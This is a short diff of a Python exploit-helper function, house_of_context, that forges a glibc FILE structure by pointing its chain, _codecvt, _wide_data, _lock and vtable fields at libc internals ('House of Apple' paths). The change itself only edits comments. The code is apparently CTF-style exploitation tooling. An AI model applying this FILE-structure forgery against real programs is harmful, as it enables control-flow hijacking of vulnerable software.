@@ -125,10 +125,10 @@ def house_of_context(libc,file='stdout',**kwargs) -> (int, bytes):
     # hoa2 path
     fp._IO_write_ptr = 2
     fp._IO_write_end = 1
-    fp.chain = libc.sym['_IO_wfile_underflow']
+    fp.chain = libc.sym['_IO_wfile_underflow'] # hoa3 path
   
-    fp._codecvt = fst + 0xa0 + 0x30 # std.file._IO_backup_base
-    fp.unknown2 = p64(0)*5 + p64(fst + len(bytes(fp))+8*8)
+    fp._codecvt = fst + 0xa0 + 0x30 # points to ↓
+    fp.unknown2 = p64(0)*5 + p64(fst + len(bytes(fp))+8*8) # points to after the &stdout spray
     fp._lock = libc.sym['__pthread_keys']+0x110 
     fp._wide_data = fst + 0x28
     fp.vtable = libc.sym['_IO_wfile_jumps']#-0x18
